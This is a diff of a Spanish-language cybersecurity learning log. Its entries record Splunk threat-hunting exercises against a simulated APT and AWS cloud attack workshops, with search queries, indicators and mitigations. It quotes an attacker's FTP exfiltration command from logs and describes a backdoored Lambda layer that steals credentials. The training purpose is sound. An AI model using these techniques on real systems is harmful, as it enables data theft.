@@ -7,7 +7,7 @@ parent: 100 days challenge 🗻
 ---
 
 {: .work }
->En este apartado se regista el progreso dia a dia del reto.
+>En este apartado se registra el progreso día a día del reto
 
 ---
 <details>
@@ -765,3 +765,341 @@ parent: 100 days challenge 🗻
   </ul>
 </details>
 
+<details>
+  <summary><strong>Day 34: Hunting an APT with Splunk</strong></summary>
+  <p>Hoy empiezo voy a empezar unos ejercicios de Hunting an APT.</p>
+  <p>En el ejercicio de hoy:</p>
+  <p>Se ha detectado una intrusión por parte del grupo APT Taedonggang. Se sospecha que los atacantes están exfiltrando datos utilizando el protocolo FTP no cifrado, correspondiente a la técnica T1048.003 según el marco MITRE ATT&CK. <a href="https://attack.mitre.org/techniques/T1048/003/">https://attack.mitre.org/techniques/T1048/003/</a></p>
+  <p><strong>Proceso de Detección:</strong></p>
+  <ul>
+    <li>Fuentes de Datos Iniciales:</li>
+    <ul>
+      <li>Suricata: Detección de intrusiones y análisis de tráfico de red.</li>
+      <li>Palo Alto Networks: Monitorización de amenazas.</li>
+      <li>Sysmon (Microsoft): Registro de eventos operacionales detallados.</li>
+    </ul>
+    <li>Identificación de Rutas de Comunicación:</li>
+    <ul>
+      <li>Suricata: Eventos FTP.</li>
+      <ul>
+        <li><code>index=botsv2 ftp sourcetype="suricata" | stats count by src_ip dest_ip | sort - count</code></li>
+        <li>Identificación de hosts internos como estaciones de trabajo comprometidas.</li>
+      </ul>
+      <li>Palo Alto Networks: Análisis del tráfico de amenazas.</li>
+      <ul>
+        <li><code>index=botsv2 sourcetype=pan:threat | stats count by src_ip dest_ip | sort - count</code></li>
+      </ul>
+      <li>Sysmon: Identificación de eventos de conexión de red.</li>
+      <ul>
+        <li><code>index=botsv2 ftp sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" | stats count by host | sort - count</code></li>
+      </ul>
+    </ul>
+    <li>Comandos Ejecución:</li>
+    <ul>
+      <li>Comandos relacionados con el uso del cliente FTP de Windows.</li>
+      <ul>
+        <li><code>"C:\Windows\system32\ftp.exe" open hildegardsfarm.com</code></li>
+        <li>Indica una conexión FTP a un servidor externo para la transferencia de datos.</li>
+      </ul>
+    </ul>
+    <li>Análisis Temporal de src/dest:</li>
+    <ul>
+      <li>Análisis de series temporales para detectar patrones de tráfico.</li>
+      <ul>
+        <li><code>index=botsv2 ftp sourcetype="pan:*" src=* dest=* | eval uniq=src." ".dest | timechart count by uniq</code></li>
+        <li>Se detectaron picos de tráfico FTP el 23 y 25 de agosto.</li>
+      </ul>
+    </ul>
+    <li>Análisis Detallado del Tráfico FTP:</li>
+    <ul>
+      <li>Se identificaron dos direcciones IP de origen relacionadas con eventos FTP.</li>
+      <ul>
+        <li><code>index=botsv2 ftp sourcetype="stream:ftp" src=* dest=160.153.91.7</code></li>
+        <li>Transferencia de archivos desde estaciones de trabajo comprometidas a un servidor externo.</li>
+      </ul>
+    </ul>
+  </ul>
+</details>
+
+<details>
+  <summary><strong>Day 35: Hunting an APT with Splunk II</strong></summary>
+  <p>El día de hoy terminé la práctica de ayer.</p>
+  <p><strong>El resumen de la caza de exfiltración a través de FTP es:</strong></p>
+  <ul>
+    <li>Observamos que FTP se utilizó para la exfiltración de datos.</li>
+    <li>FTP fue utilizado principalmente y se observó en tres sistemas.</li>
+  </ul>
+  <p><strong>Acciones:</strong></p>
+  <ul>
+    <li>Basadas en el archivo winsys32.dll encontrado con el argumento -s en Sysmon.</li>
+    <ul>
+      <li>No fue completamente exitoso.</li>
+      <li>Se observaron múltiples intentos, incluyendo un comando ftp open.</li>
+    </ul>
+  </ul>
+  <ul>
+    <li>Los dos equipos de trabajo, wrk-btun y wek-klagerf, se observaron comunicándose con la IP externa 160[.]153[.]91[.]7 a través de múltiples fuentes.</li>
+    <li>Los servidores mercury y venus solo se observaron en el tráfico de Palo Alto.</li>
+    <li>El adversario está utilizando el comando ftp en los dos equipos de trabajo principalmente para intentar exfiltrar datos a esta dirección IP.</li>
+    <li>Se utilizó un nombre de archivo con extensión dll para ocultar que se estaba llamando a un script.</li>
+    <li>Los eventos de FTP proporcionan información sobre la actividad de carga y descarga.</li>
+    <li>Los mismos siete archivos están siendo descargados en ambos equipos de trabajo.</li>
+    <li>Los archivos PDF de Froht.ly se están cargando con éxito varias veces, probablemente porque TopSecretYest.pdf parece no querer cargarse (PAN: Threat muestra bloqueado).</li>
+    <li>El tráfico de exfiltración está destinado a un dominio llamado hildegardsfarm.com.</li>
+  </ul>
+  <p>Puedes ver el reporte completo de la práctica aquí: <a href="https://nottaroff.github.io/workspace/docs/Hunting%20an%20APT/1.%20Exfiltración%20a%20través%20de%20FTP/">Reporte Completo</a></p>
+</details>
+
+<details>
+  <summary><strong>Día 36: Cazando un APT: Infraestructura del Adversario</strong></summary>
+  <p>Continuando con la serie "Cazando un APT", hoy he llevado a cabo una práctica enfocada en la infraestructura de un grupo de ciberactores que ha estado perpetrando ataques en redes informáticas de diversas organizaciones.</p>
+  <p><strong>Los hallazgos clave son:</strong></p>
+  <ul>
+    <li>El grupo se centra en servidores web expuestos a Internet y utiliza certificados SSL autofirmados.</li>
+    <li>Dependen de servidores VPS situados en países con políticas de privacidad robustas, como Alemania.</li>
+  </ul>
+  <p><strong>Metodología:</strong></p>
+  <ul>
+    <li>Centramos nuestra identificación en la dirección IP **45[.]77[.]65[.]211** y analizamos el tráfico SSL en Splunk.</li>
+    <li>Observamos varios hashes de certificados y los verificamos en OSINT para determinar su maliciosidad.</li>
+    <li>Utilizamos herramientas de OSINT para geolocalizar la dirección IP, confirmando que los VPS están desplegados en Alemania.</li>
+  </ul>
+  <p><strong>Conclusiones:</strong></p>
+  <ul>
+    <li>El adversario tiene al menos cuatro servidores adicionales desplegados, identificados mediante el hash de los certificados SSL.</li>
+    <li>Buscar infraestructura del atacante sin pistas adicionales es desafiante y que los certificados SSL pueden proporcionar valiosa información sobre la misma.</li>
+    <li>Los certificados SSL pueden proporcionar valiosa información sobre la infraestructura del adversario.</li>
+  </ul>
+  <p>Finalmente, sugerimos varios pasos a seguir, incluyendo la automatización de la recopilación de OSINT, la corroboración de fuentes y la vigilancia continua de los hashes de los certificados y las direcciones IP identificadas.</p>
+  <p>Puedes ver más en detalle en el siguiente enlace: Reporte Completo</p>
+</details>
+
+<details>
+  <summary><strong>Día 37: Cazando un APT - Cuenta Local</strong></summary>
+  <p>En la continuación de la serie "Cazando un APT", hoy me centré en la técnica que utilizan los adversarios para mantener acceso persistente en equipos remotos, específicamente en la creación de cuentas locales sospechosas.</p>
+  <p><strong>Identificación de Eventos de Creación de Cuentas:</strong></p>
+  <ul>
+    <li>Utilicé el log de seguridad de Windows para buscar el ID de evento 4720, que indica la creación de una cuenta.</li>
+    <li>La consulta utilizada fue: <code>index=botsv2 sourcetype="wineventlog" EventCode=4720</code></li>
+  </ul>
+  <p><strong>Análisis de Eventos Encontrados:</strong></p>
+  <ul>
+    <li>Encontré 4 eventos de creación de cuentas de usuario.</li>
+    <li>Examiné los nombres de cuenta clave, identificando las cuentas <code>svcnc</code>, <code>service3</code>, y <code>billy.tun</code> como sospechosas.</li>
+  </ul>
+  <p><strong>Verificación de Sistemas Afectados:</strong></p>
+  <ul>
+    <li>Analicé dónde y cuándo fueron creadas estas cuentas utilizando la consulta: <code>index=botsv2 sourcetype=wineventlog EventCode=4720 Account_Name=svcvnc | table _time host Account_Name SAM_Account_Name</code></li>
+    <li>Observé que los registros de creación de cuentas ocurrieron en dos estaciones de trabajo y dos servidores.</li>
+    <li>Detecté la creación de la misma cuenta en cuatro sistemas diferentes en un corto período de tiempo, lo cual es sospechoso.</li>
+    <li>Utilicé los comandos <code>table</code> y <code>transpose</code> en Splunk para comparar valores de atributos en los registros de eventos de Windows. Descubrí que ciertos campos estaban consistentemente vacíos, lo cual es inusual.</li>
+  </ul>
+  <p>Para más detalles, puedes consultar el análisis completo en el siguiente enlace: Análisis Completo</p>
+</details>
+
+
+<details>
+  <summary><strong>Día 38: Cazando un APT - Cuenta Local</strong></summary>
+  <p>Hoy he completado el análisis que comencé ayer sobre cómo detectar la persistencia de un adversario en nuestros sistemas, específicamente cuando se crean varias cuentas de usuarios sospechosas.</p>
+  <p><strong>Complementando con lo visto anteriormente:</strong></p>
+  <ul>
+    <li>Realicé un análisis detallado de los eventos de creación de cuentas, identificando las cuentas creadas, el momento y los sistemas involucrados.</li>
+  </ul>
+  <p><strong>Búsqueda de Eventos Adicionales:</strong></p>
+  <ul>
+    <li>Amplié la búsqueda para incluir otros eventos de seguridad (como 4738 y 4732) que podrían indicar actividades sospechosas relacionadas con las cuentas de usuario.</li>
+  </ul>
+  <p>Para más detalles, puedes consultar el análisis completo en el siguiente enlace: Análisis Completo</p>
+</details>
+
+
+<details>
+  <summary><strong>Día 39: Cazando un APT - Exfiltración DNS</strong></summary>
+  <p>Continuando con la serie "Cazando un APT", hoy analicé una posible exfiltración de datos utilizando el protocolo DNS.</p>
+  <p><strong>Investigación de la Exfiltración de Datos a través de DNS:</strong></p>
+  <ul>
+    <li>Utilicé la fuente de datos <code>index=botsv2 sourcetype=stream:dns</code> para buscar eventos relacionados con la dirección IP **160.153.91.7**.</li>
+    <li>Identifiqué que varios eventos están asociados con el dominio **hildegardsfarm.com**.</li>
+  </ul>
+  <p><strong>Búsqueda más específica para este dominio:</strong></p>
+  <ul>
+    <li>Realicé la búsqueda usando <code>index="botsv2" sourcetype="stream:dns" hildegardsfarm.com</code>.</li>
+    <li>Enfatizo en los mensajes de tipo **QUERY**, ya que estos son los utilizados por los hosts internos para enviar datos embebidos en las consultas DNS a los adversarios.</li>
+  </ul>
+  <p><strong>URL Toolbox:</strong></p>
+  <ul>
+    <li>Descompuse las consultas DNS en subdominios, dominios de nivel superior, y otros componentes utilizando la herramienta URL Toolbox.</li>
+    <li>Calculé la entropía de los subdominios para determinar si son generados automáticamente.</li>
+  </ul>
+  <p><strong>Consulta utilizada:</strong></p>
+  <pre><code>index="botsv2" sourcetype="stream:dns" hildegardsfarm.com message_type=QUERY query=*.hildegardsfarm.com
+| eval query=mvdedup(query)
+| eval list="mozilla"
+| ut_parse_extended(query,list)
+| ut_shannon(ut_subdomain)
+| table src dest query ut_subdomain ut_shannon</code></pre>
+  <p>Los subdominios generados tienen un puntaje de entropía alto, lo que sugiere que son generados automáticamente por un algoritmo. Los datos parecen ser exfiltrados mediante consultas DNS, utilizando subdominios generados automáticamente, que embeben la información en las consultas.</p>
+</details>
+
+<details>
+  <summary><strong>Día 40: Cazando un APT - Exfiltración DNS II</strong></summary>
+  <p>Hoy realicé la segunda parte de la detección y prevención de la exfiltración de datos a través del protocolo DNS.</p>
+  <p><strong>Resumen de los pasos seguidos en la práctica:</strong></p>
+  <ul>
+    <li>Consulté la fuente de datos <code>stream:dns</code> para monitorear eventos DNS relacionados con **hildegardsfarm.com**.</li>
+    <li>Observé consultas inusuales y de alto volumen a subdominios de **hildegardsfarm.com**, indicativos de posible exfiltración de datos.</li>
+    <li>Empleé la URL Toolbox para analizar los subdominios, destacando puntajes de entropía altos, sugiriendo generación automática por algoritmos.</li>
+    <li>Visualicé la exfiltración de datos a través de DNS, notando la necesidad de dividir paquetes para evitar restricciones de firewall.</li>
+  </ul>
+  <p><strong>Una vez detectada la exfiltración, los pasos a seguir serían:</strong></p>
+  <ul>
+    <li>Agregar la IP **160.153.91.7** y el dominio **hildegardsfarm.com** a la lista de observación o bloqueo.</li>
+    <li>Mantener un monitoreo constante de la entropía y longitud de subdominios en el tráfico DNS.</li>
+    <li>Realizar análisis de tráfico en los sistemas para identificar y detectar anomalías.</li>
+  </ul>
+  <p>Puedes ver la práctica completa en el workspace: Análisis Completo</p>
+</details>
+
+<details>
+  <summary><strong>Day 41: Hunting an APT - Lateral Movement</strong></summary>
+  <p>Hoy he empezado un nuevo capítulo en mi fase de Hunting an APT. Me he dedicado a la identificación y análisis de posibles movimientos laterales en la red utilizando Windows Management Instrumentation (WMI). He aprendido que los adversarios pueden utilizar WMI para interactuar con sistemas locales y remotos, ejecutando archivos de forma remota y realizando funciones tácticas.</p>
+  <p><strong>Búsqueda en Splunk:</strong></p>
+  <ul>
+    <li>Desarrollé una búsqueda en Splunk enfocada en eventos clave: 4624 (inicio de sesión exitoso en red) y 1 de Sysmon (creación de procesos).</li>
+    <li>Excluí eventos con svchost.exe como proceso padre para reducir el ruido en los datos.</li>
+    <li>Utilizando comandos de Splunk, extraje y evalué los campos Logon_ID y Security_ID.</li>
+    <li>Creé transacciones basadas en el campo session para agrupar eventos relacionados.</li>
+  </ul>
+  <p><strong>Resultados:</strong></p>
+  <p>Los resultados muestran que la estación de trabajo wrf-klagerf y el servidor venus presentan signos de ejecución utilizando la cuenta service3 desde sesiones de inicio de sesión en la red, sugiriendo posibles movimientos laterales mediante WMI.</p>
+  <p><strong>Referencia:</strong></p>
+  <p>Para más información sobre esta técnica de ataque, puedes consultar la <a href="https://attack.mitre.org/techniques/T1047/">página de MITRE ATT&CK</a>.</p>
+</details>
+
+<details>
+  <summary><strong>Day 42: Hunting an APT - Lateral Movement II</strong></summary>
+  <p>Continuando con el módulo de ayer, he profundizado en cómo los adversarios pueden aprovechar WMI (Windows Management Instrumentation) para interactuar con sistemas locales y remotos, permitiéndoles ejecutar archivos de forma remota y realizar diversas funciones tácticas.</p>
+  <p>Para finalizar, he estado dedicado a la inspección detallada de sesiones de inicio de sesión en nuestra red. Mi enfoque ha sido utilizar los IDs de inicio de sesión, ya sea el Logon_ID de Sysmon o el LogonId de Wineventlog.</p>
+  <p>Los análisis realizados hoy indican que los hosts internos "venus" y "wrk-klagers" han sido infectados mediante movimiento lateral desde "wrk-btun". El uso de PowerShell parece ser una herramienta clave utilizada por el adversario para facilitar este movimiento.</p>
+  <p><strong>Conclusiones:</strong></p>
+  <ul>
+    <li>Configurar alertas para PowerShell codificado.</li>
+    <li>Gestionar herramientas de administración remota de Windows.</li>
+    <li>Monitorizar el uso de herramientas administrativas.</li>
+    <li>Establecer alertas para secuencias específicas de eventos.</li>
+    <li>Analizar los flujos de datos en el entorno.</li>
+  </ul>
+  <p>Puedes revisar la práctica en detalle en el <a href="https://nottaroff.github.io/workspace/docs/Hunting%20an%20APT/5.%20Lateral%20Movement/">workspace de Notaroff</a>.</p>
+</details>
+
+<details>
+  <summary><strong>Day 43: Hunting an APT - Borrado de Registros</strong></summary>
+  <p>Siguiendo en la investigación de diferentes tácticas que usan los adversarios, hoy me enfoqué en investigar una táctica comúnmente utilizada por los adversarios para cubrir sus huellas, el borrado de registros de eventos de Windows.</p>
+  <p>En primera instancia, identifiqué los eventos de borrado de registros en Windows utilizando el código de evento 1102. Al buscar en los registros de eventos de Windows, vi que la estación de trabajo wrk-klagerf tuvo sus registros borrados y que la cuenta service3 fue responsable de esta acción.</p>
+  <p>Analicé el uso del comando wevtutil.exe, que permite interactuar con los registros de eventos desde la línea de comandos. Encontramos referencias a este ejecutable tanto en Sysmon como en Wineventlog, lo que sugiere un uso continuado de este comando para borrar registros. Al profundizar en los registros de eventos de Windows y ordenar los eventos, observamos que wevtutil.exe se usó repetidamente con los argumentos "el" (para enumerar los registros) y "cl" (para borrar registros específicos).</p>
+  <p>Este análisis reveló 485 eventos, indicando que probablemente se borraron todos los registros de Windows posibles en secuencia.</p>
+</details>
+
+
+<details>
+  <summary><strong>Day 44: Hunting an APT - Borrado de Registros II</strong></summary>
+  <p>Para finalizar este capítulo sobre la caza de borrado de registros, realicé un análisis detallado de los eventos registrados por Sysmon, centrándome en detectar actividades de borrado de registros. En la revisión, encontramos que wevtutil.exe se utilizó repetidamente para borrar registros, lo cual es una táctica común para ocultar actividades maliciosas.</p>
+  <p>He estado recopilando consejos prácticos para fortalecer la seguridad frente al borrado de registros. Por ejemplo, se recomienda configurar políticas de grupo para registrar borrados, monitorear y alertar sobre el evento 1102, y el evento 4688 con líneas de comando específicas relacionadas con wevtutil.exe. También es importante revisar y actualizar las políticas de los sistemas para proteger los registros críticos que no deben ser eliminados.</p>
+  <p>Puedes ver en detalle la práctica en el <a href="https://nottaroff.github.io/workspace/docs/Hunting%20an%20APT/6.%20Clearing%20Logs/">workspace de Notaroff</a>.</p>
+</details>
+
+<details>
+  <summary><strong>Day 45: Hunting an APT - Remote Data Staging</strong></summary>
+  <p>En un nuevo capítulo en la serie de Hunting an APT, hoy he observado posibles actividades relacionadas con la organización y exfiltración de datos en nuestra red.</p>
+  <p>En particular, he investigado los archivos que se usarían en un entorno de oficina, como documentos PDF, Word, Excel y archivos comprimidos. Esto me llevó a observar detenidamente el protocolo SMB (Server Message Block) utilizado para compartir archivos en entornos de red, especialmente en entornos Windows.</p>
+  <p>Mi investigación se centró en un archivo específico identificado como "31564-pdf.pdf" dentro del conjunto de datos SMB. Analicé las transacciones relacionadas con este archivo, observando patrones de flujo de datos y comandos utilizados. En particular, me enfoqué en comandos como "smb2 read", "smb2 create" y "smb2 close", los cuales revelaron cómo se estaban manipulando y transfiriendo los datos en cuestión.</p>
+  <p>He conseguido identificar una actividad significativa de transferencia de datos entre la estación de trabajo de Billy Tun y el servidor Venus. Observé que una cantidad considerable de datos estaba siendo transferida desde el servidor hacia la estación de trabajo, lo cual podría ser un posible movimiento de información desde el servidor hacia un dispositivo local.</p>
+  <p>Para obtener más información sobre esta técnica de ataque, puedes consultar la <a href="https://attack.mitre.org/techniques/T1074/">página de MITRE ATT&CK</a>.</p>
+</details>
+
+<details>
+  <summary><strong>Day 46: Hunting an APT - Remote Data Staging II</strong></summary>
+  <p>Siguiendo con la sesión anterior sobre la exfiltración de datos de nuestra red, hoy investigué el conjunto de datos relacionados con FTP, detectando actividades sospechosas que sugieren una posible exfiltración de datos. Por ejemplo, la estación de trabajo de Billy (IP: 10.0.2.107) subió un archivo PDF a un servidor externo (IP: 160.153.91.7), lo que indica un posible caso de exfiltración a través de FTP.</p>
+  <p>Además, al analizar los datos de SMB, observé que varios documentos, principalmente archivos PDF, se transfirieron desde un servidor interno (IP: 10.0.1.101) a la estación de trabajo de Billy, y luego se enviaron al servidor externo mencionado.</p>
+  <p>Para mejorar nuestras capacidades de detección y prevención, se deben considerar las siguientes acciones:</p>
+  <ul>
+    <li>Realizar un análisis de anomalías en la comunicación entre la estación de trabajo y el servidor.</li>
+    <li>Registrar los puntos finales para monitorear los datos escritos en el sistema de archivos.</li>
+    <li>Mejorar el registro de la red para capturar transferencias de datos entre enclaves.</li>
+    <li>Buscar actividades posteriores, como transferencias de archivos a direcciones externas o escrituras a dispositivos USB.</li>
+  </ul>
+  <p>Puedes encontrar la práctica completa en el <a href="https://nottaroff.github.io/workspace/docs/Hunting%20an%20APT/7.%20Data%20Staging/">workspace de Notaroff</a>.</p>
+</details>
+
+<details>
+  <summary><strong>Day 47: Hunting an APT - Reconnaissance</strong></summary>
+  <p>En el capítulo de hoy me enfoqué en la caza de reconocimiento, buscando identificar posibles adversarios que podrían haber sido descuidados en sus métodos.</p>
+  <p>Encontré detalles específicos relacionados con un posible ataque que ocurrió en agosto de 2017, afectando al sitio web de la empresa ejemplo, www.froth.ly. Al examinar cadenas de agente de usuario sospechosas, identifiqué una en particular que se destacó: Mozilla/5.0 (X11; U; Linux i686; ko-KP; rv: 19.1br) Gecko/20130508 Fedora/1.9.1-2.5.rs3.0 NaenaraBrowser/3.5b4. Este navegador, Naenara, es la versión de Firefox utilizada en la República Popular Democrática de Corea (RPDC), e integrada en el sistema operativo Red Star, el cual es el sistema oficial de Corea del Norte.</p>
+  <p>Haciendo la búsqueda en Splunk, pude identificar 2 IPs internas y 3 IPs externas. Al cruzar la información de activos con las IPs internas, descubrí que una de ellas (172.31.4.249) pertenecía a Kevin Lagerfield, con el nombre de host "gacrux". Kevin ha accedido a varios sistemas, incluyendo AWS, brewertalk, linux, mysql y web. La otra IP interna (172.31.6.251) no se encontraba en la hoja de activos, pero parece ser que era la IP de nuestro sitio web corporativo.</p>
+</details>
+
+<details>
+  <summary><strong>Day 48: Hunting an APT - Reconnaissance II</strong></summary>
+  <p>En la segunda parte del ejercicio de reconocimiento, hoy he trabajado en el análisis de la visibilidad pública de nuestra web corporativa, centrándome en cómo los adversarios pueden recopilar información sobre nosotros antes de un ataque. Esto se basa en la técnica del MITRE ATT&CK T1593, que se enfoca en la búsqueda de sitios web y dominios abiertos.</p>
+  <p>Utilicé Splunk para buscar accesos a nuestro sitio web de ejemplo mediante un agente de usuario específico (NaenaraBrowser), que habíamos identificado previamente como sospechoso. Confirmé que este agente de usuario ha estado navegando por nuestros activos web y accediendo a una hoja de cálculo con contactos de la empresa. Identificamos que este navegador tiene origen en Corea del Norte. Encontramos la dirección IP asociada con el navegador, que accedió a los contactos de la empresa desde nuestro sitio web. Esto podría permitir al adversario tener acceso a información sensible y potencialmente dirigir ataques a nuestros empleados.</p>
+  <p>Como siguientes pasos se ha concluido que debemos entender la visibilidad pública de la organización y monitorear a los ejecutivos clave que son bien conocidos. Es necesario determinar si todos los empleados necesitan el mismo nivel de visibilidad y monitorear si su información aparece públicamente. Debemos prestar especial atención a nuestro sitio web y otros activos corporativos, minimizando la información OSINT disponible sobre empleados y activos informáticos. Además, podemos sembrar objetos con información errónea en la organización, incluyendo el sitio web, que luego puedan ser monitoreados para detectar actividad adversaria y hacer que los atacantes inviertan más esfuerzo en sus intentos.</p>
+</details>
+
+
+<details>
+  <summary><strong>Day 49: Hunting an APT - Initial Access</strong></summary>
+  <p>En el ejercicio de hoy vi una ataque a nuestra red, identificando los vectores de acceso inicial. Durante esta investigación, identificamos que el acceso inicial se logró mediante un archivo adjunto en un correo electrónico de spear phishing. Realicé análisis detallados de los archivos adjuntos y en los registros de correo electrónico. Descubrimos que el intento de phishing se llevó a cabo dos veces, con el segundo intento posiblemente siendo exitoso.</p>
+  <p>Finalmente, encontramos que el mismo remitente envió correos electrónicos idénticos a cuatro destinatarios. Estos correos tenían el mismo asunto y contenido, lo que sugiere una estrategia de ataque dirigida específicamente a estos destinatarios. Además, observamos que los correos electrónicos se enviaron en un corto intervalo de tiempo, pero de manera individual, lo que podría indicar un intento de evitar la detección.</p>
+  <p>En conclusión, parece que nuestra empresa fue probablemente víctima de phishing a través de un archivo adjunto en un correo electrónico. Ambos intentos de phishing estuvieron dirigidos a los mismos destinatarios, con el mismo remitente, asunto y contenido en ambos casos. Aunque el primer intento fue detectado como un troyano, el segundo intento no generó ninguna alerta, lo que sugiere que podría haber sido exitoso.</p>
+</details> 
+
+
+<details>
+  <summary><strong>Day 50: Threat hunting para amenazas internas</strong></summary>
+  <p>Después de terminar los ejercicios de Threat hunting (Hunting an APT) de Splunk Boss of the SOC, decidí continuar con el guion que había planteado desde el primer momento para acabar los puntos teóricos que me faltan.</p>
+  <p>Así que el día de hoy he estado estudiando la identificación y mitigación de amenazas internas. Principalmente tres tipos de amenazas internas: las provenientes de personas malintencionadas, negligentes y comprometidas.</p>
+  <ul>
+    <li>Las personas malintencionadas: Buscan dañar la organización por venganza o beneficio económico. Un punto de mitigación a ello sería implementar gestión de acceso y monitorización continua de cuentas inactivas.</li>
+    <li>Las personas internas negligentes: Representan un riesgo debido a su falta de conocimiento o descuido en seguridad. Para mitigarlo se podría aplicar una capacitación continua y la implementación de políticas claras sobre el manejo de datos sensibles.</li>
+    <li>Las personas internas comprometidas: Son usuarios legítimos cuyas credenciales han sido comprometidas por atacantes externos. Para mitigar esto se podría implementar una autenticación multifactor y el monitoreo de comportamientos anómalos como estrategias clave.</li>
+  </ul>
+  <p>También he visto algunos de los indicadores clave para su detección, como el acceso no autorizado y cambios en el comportamiento del usuario. Para reforzar la postura de seguridad, se puede implementar diversas estrategias: como la creación y comunicación de políticas claras, el control de acceso basado en el principio de mínimo privilegio, la autenticación multifactor y la capacitación regular del personal. También es importante un monitoreo continuo de la actividad del usuario y la red, junto con simulaciones de ataques para identificar y corregir vulnerabilidades.</p>
+</details>
+
+<details>
+  <summary><strong>Day 51: Threat hunting an APT</strong></summary>
+  <p>Al terminar los apartados prácticos de Hunting an APT, he querido realizar un pequeño apartado sobre los conceptos que he recopilado.</p>
+  <p>He podido destacar que las APT se dirigen a organizaciones específicas con objetivos claros como el robo de propiedad intelectual y el espionaje, operando durante largos periodos y utilizando técnicas avanzadas. Estas amenazas emplean métodos de sigilo y evasión, como cifrado de comunicaciones y el uso de herramientas legítimas del sistema, y sus fines suelen estar relacionados con el espionaje y la perturbación de operaciones críticas.</p>
+  <p>Para el hunting de APTs, he visto que es fundamental conocer sus Tácticas, Técnicas y Procedimientos (TTPs). Las tácticas incluyen estrategias generales como la persistencia y el movimiento lateral; las técnicas abarcan métodos específicos como la explotación de vulnerabilidades y el phishing; y los procedimientos detallan la implementación de estas técnicas.</p>
+  <p>Al finalizar las conclusiones es importante destacar la evolución constante de los APTs y la necesidad de adelantarse a las amenazas mediante la inteligencia de fuentes abiertas OSINT y plataformas de inteligencia de amenazas. Estas herramientas enriquecen los indicadores de compromiso con información contextual y facilitan la colaboración entre profesionales de la seguridad.</p>
+</details>
+
+<details>
+  <summary><strong>Day 52: Threat hunting in cloud</strong></summary>
+  <p>En el día de hoy he recopilado información sobre los desafíos y técnicas de seguridad en entornos de nube.</p>
+  <p>Los principales desafíos de seguridad que enfrentamos al adoptar servicios en la nube incluyen la dificultad para mantener visibilidad y control debido a la naturaleza dinámica de estos entornos, los riesgos adicionales derivados del alojamiento de datos de múltiples clientes en la misma infraestructura y las vulnerabilidades causadas por configuraciones predeterminadas o incorrectas. También existe confusión sobre la división de responsabilidades entre el proveedor y el cliente, lo que puede llevar a malentendidos sobre quién es responsable de qué aspectos de la seguridad.</p>
+  <p>En cuanto a las técnicas específicas para cazar amenazas en la nube, es importante analizar logs de eventos y accesos proporcionados por los proveedores de servicios en la nube, como AWS CloudTrail y Azure Monitor, para detectar comportamientos inusuales. También es esencial utilizar herramientas nativas de seguridad, como AWS GuardDuty y Azure Security Center, y monitorear el tráfico de red.</p>
+  <p>Para asegurar las cargas de trabajo en la nube es necesario integrar prácticas de seguridad desde el inicio del ciclo de desarrollo (DevSecOps), implementar políticas estrictas de gestión de identidades y accesos (IAM) para asegurar que solo las personas y servicios autorizados puedan acceder a los recursos críticos, y asegurando que todos los datos, tanto en tránsito como en reposo, estén cifrados y que las claves se gestionen de manera segura.</p>
+</details>
+
+
+<details>
+  <summary><strong>Day 53: Threat hunting in cloud - Privilege Escalation via AWS Lambda</strong></summary>
+  <p>Ayer vi una pequeña introducción al Threat hunting en la nube. Hoy quería ver un poco la parte práctica. Así que hice un taller de un ataque en la nube que involucró a un hacker que obtuvo credenciales de un usuario de AWS con bajos privilegios y sin acceso a S3. El atacante utilizó estas credenciales para ejecutar el comando list-functions en diferentes regiones y encontrar funciones Lambda accesibles.</p>
+  <p>El hacker descubrió una función Lambda con runtime en Python y, en su propia cuenta de AWS, creó una capa comprometida con una puerta trasera, haciéndola pública. Luego, usó el usuario de bajos privilegios en la cuenta de la víctima para actualizar la configuración de la función Lambda e insertar la capa comprometida.</p>
+  <p>Esta capa comprometida contenía una carga útil que enviaba datos críticos y sensibles a la máquina del atacante cuando se invocaba la función Lambda. El atacante configuró una máquina de escucha con una IP pública, esperando en el puerto 4444 para recibir estos datos. Al llamar la función Lambda, el hacker recibía información como el ID de clave de acceso, la clave de acceso secreta y el token de sesión, permitiéndole ejecutar el comando aws s3 ls para encontrar y exfiltrar datos sensibles.</p>
+  <p>Para investigar el ataque, el taller utiliza la herramienta CloudGuard, donde se puede extraer la siguiente información:</p>
+  <ul>
+    <li>Abuso del Token de Acceso de Lambda: Uso indebido del token desde una IP externa.</li>
+    <li>Serie de Llamadas API de Enumeración: Detectó la ejecución de list-functions en varias regiones, indicando un intento de movimiento lateral y escalada de privilegios.</li>
+    <li>Adición de una Capa de Lambda desde una Cuenta Externa: Inserción de una capa desde una cuenta de AWS externa.</li>
+    <li>Actualización de Configuración de Lambda: Esto puede ayudar a entender cómo el atacante exfiltró las credenciales sensibles.</li>
+  </ul>
+</details>
+
+<details>
+  <summary><strong>Day 54: Threat hunting in cloud - Lateral Movement</strong></summary>
+  <p>Hoy observé un nuevo ejemplo de caza de amenazas en un entorno de nube, específicamente la detección de movimiento lateral. El ataque comenzó con la obtención de claves de acceso de AWS comprometidas, que permitieron al atacante generar credenciales temporales usando el comando get-session-token para evadir la defensa. Verificaron el acceso al historial de eventos de la cuenta mediante el comando lookup-events, confirmando que el usuario comprometido tenía permisos de solo lectura. Esto les permitió descubrir que el usuario había ejecutado el comando AssumeRole para asumir el rol LambdaCreator, obteniendo información clave como la región por defecto y el ARN del rol.</p>
+  <p>El atacante verificó los eventos realizados por el rol LambdaCreator y encontró que se había configurado y actualizado el código de una función llamada Automation-UpdateSSMParam. Utilizando el comando sts assume role, escaló privilegios al rol LambdaCreator. Intentaron el comando get-function pero recibieron un error de acceso denegado. Entonces recurrieron a la ingeniería social, descubriendo mediante una búsqueda en Google que el rol asociado a la función tenía permisos de AmazonSSMFullAccess. Aprovechando el permiso UpdateFunctionConfiguration, inyectaron una capa maliciosa en la función, creando esta capa en su propia cuenta de AWS y haciéndola públicamente disponible.</p>
+  <p>El atacante insertó la capa maliciosa en la cuenta de la víctima usando el comando UpdateFunctionConfiguration. Una vez invocada la función, la capa maliciosa envió todas las variables de entorno, incluyendo el token STS del rol de la función, al atacante. Con este token, iniciaron una sesión en una instancia EC2 usando el API SSM start session y extrajeron el nombre del rol de la instancia: DynamoDBFullAccess. Accedieron a las tablas de DynamoDB, revelando información sensible.</p>
+</details>
